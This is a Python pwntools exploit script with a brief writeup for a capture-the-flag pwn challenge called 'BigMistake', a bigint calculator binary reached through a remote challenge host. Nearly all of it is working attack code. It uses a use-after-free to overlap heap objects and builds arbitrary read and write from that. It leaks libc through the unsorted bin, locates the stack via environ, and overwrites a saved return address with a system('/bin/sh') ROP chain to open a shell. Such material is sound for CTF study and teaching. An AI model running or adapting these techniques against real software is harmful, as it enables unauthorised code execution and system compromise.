#!/usr/bin/env python3

from pwn import *
import os

e = ELF("./BigMistake_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

DOCKER_PORT = 1337
REMOTE_NC_CMD = "nc bigmistake.challs.olicyber.it 38076"

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
# b *main+0xa6
# b *Calculator::eval_assign+0x1c7
c
"""


argv = [ld.path, "--library-path", ".", e.path]

if args.GDB:
    r = gdb.debug(argv, gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(argv)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    cmd = REMOTE_NC_CMD.split()
    r = remote(cmd[1], int(cmd[2]))

ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

BASE = 1 << 60
MASK = BASE - 1

# after freeing the 0x490 chunk, fd == libc_base + 0x204120.
UNSORTED_FD_OFF = 0x204120
MAIN_RET_LIBC_OFF = 0x2a1ca


def num(words):
    words = list(words)
    assert len(words) > 0

    for w in words:
        assert 0 <= w <= MASK, hex(w)

    # [1, 0, 0, 0] must stay four limbs to allocate the wanted vector chunk.
    s = f"{words[-1]:x}"
    for w in reversed(words[:-1]):
        s += f"{w:015x}"
    return s.encode()


def parse_num(out):
    line = out.split(b"\n", 1)[0].strip()

    if line.startswith(b"-"):
        line = line[1:]

    if line == b"" or line == b"0":
        return [0]

    line = line.decode()
    words = []

    while line:
        words.append(int(line[-15:], 16))
        line = line[:-15]

    return words


def expr(s, wait=True):
    if isinstance(s, str):
        s = s.encode()

    sl(s)

    if not wait:
        return b""

    return ru(b"> ", drop=True)


def setup_overlap():
    expr(b"x = 0")

    expr(b"a = 1")
    expr(b"b = 1")

    # main deletes the returned bigint, but the unordered_map keeps the dangling pointer.
    expr(b"a")
    expr(b"b")

    # b is taken from free chunks and allocated. b's vector will overlap/fill a's freed BigInt object.
    expr(b"x = " + num([1, 0, 0, 0]))

    
    # Make a use the fake object and verify that b can read/write it.
    expr(b"a = " + num([1]))
    leak = parse_num(expr(b"b + 0"))

    if len(leak) < 4:
        log.failure("overlap failed: b + 0 did not expose four fake BigInt fields")
        log.info(f"raw leak = {leak}")
        exit(1)

    vleak("fake.sign", leak[0])
    vleak("fake.begin", leak[1])
    vleak("fake.end", leak[2])
    vleak("fake.cap", leak[3])


def forge_fake(sign, begin, end, cap):
    # b.vec points to a's fake BigInt, so assigning b overwrites:
    # a.sign, a.vec.begin, a.vec.end, a.vec.cap.
    expr(b"b = " + num([sign, begin, end, cap]))


def read64(addr):
    forge_fake(1, addr, addr + 8, addr + 8)
    out = expr(b"a + 0")
    words = parse_num(out)
    return words[0]


def write_words(addr, words, trigger=False):
    words = list(words)
    for w in words:
        assert 0 <= w <= MASK, hex(w)

    forge_fake(1, addr, addr, addr + 8 * len(words))
    expr(b"a = " + num(words), wait=not trigger)


def leak_libc():
    # alloc a chunk large 0x480, it will go into the unsortedbin
    expr(b"a = " + num([0x111] * 0x90)) # 0x90 * 8 = 0x480
    meta = parse_num(expr(b"b + 0"))
    big_vec = meta[1]
    vleak("large vector", big_vec)

    # alloc a bigger chunk, the previous one goes into  unsortedbin     
    expr(b"a = " + num([0x222] * 0x91)) # 0x91 * 8 = 0x488 (i added 1 more limb) -> force reallocate
    fd = read64(big_vec)
    vleak("unsorted fd", fd)

    libc.address = fd - UNSORTED_FD_OFF

    aleak("libc", libc.address)

    env_addr = libc.sym["environ"]
    env_val = read64(env_addr)
    vleak("environ check", env_val)

    if env_val == 0:
        log.failure("environ is 0")
        exit(1)


def libc_text_range():
    lo = None
    hi = None

    for seg in libc.segments:
        if seg.header.p_type != "PT_LOAD":
            continue
        if not (seg.header.p_flags & 1):
            continue

        start = libc.address + seg.header.p_vaddr
        end = start + seg.header.p_memsz

        lo = start if lo is None else min(lo, start)
        hi = end if hi is None else max(hi, end)

    return lo, hi


def find_main_ret_slot():
    environ = read64(libc.sym["environ"])
    vleak("environ", environ)

    text_lo, text_hi = libc_text_range()
    exact = []
    nearby = []

    for off in range(-0x200, 0x0, 8):
        slot = environ + off
        val = read64(slot)

        if text_lo <= val < text_hi:
            prev = read64(slot - 8)
            voff = val - libc.address
            log.info(f"stack off={off:#x} slot={slot:#x} val={val:#x} voff={voff:#x} prev={prev:#x}")

            # main is called by __libc_init_first at libc+0x2a1c8.
            # saved RIP: libc+0x2a1ca.
          
            if voff == MAIN_RET_LIBC_OFF:
                exact.append(slot)


    if exact:
        best = exact[0]
    else:
        log.failure("could not find main saved RIP slot on stack")
        exit(1)

    vleak("main saved RIP slot", best)
    return best


def main():
    
    ru(b"> ")
    setup_overlap()
    leak_libc()

    main_ret = find_main_ret_slot()

    # rip: main_rbp + 8
    # eval_assign saved RIP slot: main_rbp - 0x158
    # diff: -0x160.
    eval_assign_ret = main_ret - 0x160
    vleak("eval_assign saved RIP slot", eval_assign_ret)

    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    binsh = libc.binsh()
    system = libc.sym["system"]
    exit_ = libc.sym["exit"]

    vleak("ret", ret)
    vleak("pop rdi", pop_rdi)
    vleak("/bin/sh", binsh)
    vleak("system", system)
    vleak("exit", exit_)

    chain = [
        ret,
        pop_rdi,
        binsh,
        system,
        exit_,
    ]

    # overwrites eval_assign's saved RIP while eval_assign is executing.
    write_words(eval_assign_ret, chain, trigger=True)
    r.interactive()


if __name__ == "__main__":
    main()


"""
writeup

Bigint is an object like this:
struct BigInt
{
  int sign_;
  int pad;
  unsigned long *data_begin;
  unsigned long *data_end;
  unsigned long *data_cap;
};


eval:

BigInt *res = calc.eval(line);

if (res) {
    cout << *res << endl;
    delete res;
}

if res is assigned to variables, but then freed:
variables["a"] → freed BigInt -> uaf

by freeing 2 obj a and b, and then reallocating one, i can overlap b with a's fields.
so b->vector points on a's fields.

i can build a fake struct and edit a -> i have arb read and write 

leak libc:
    i alloc a big bigint, so i can read the fake bigint metadata.
    then i alloc a bigger bigint and the old buffer will be sent to unsortedbin.
    reading that bigint gives me a libc leak.

leak stack from environ:
    i search the main ret addr and from that i have the eval_assign ret addr (current function)

rop chain:
    using the arb write i can write a rop chain overwriting eval_assign ret addr



"""
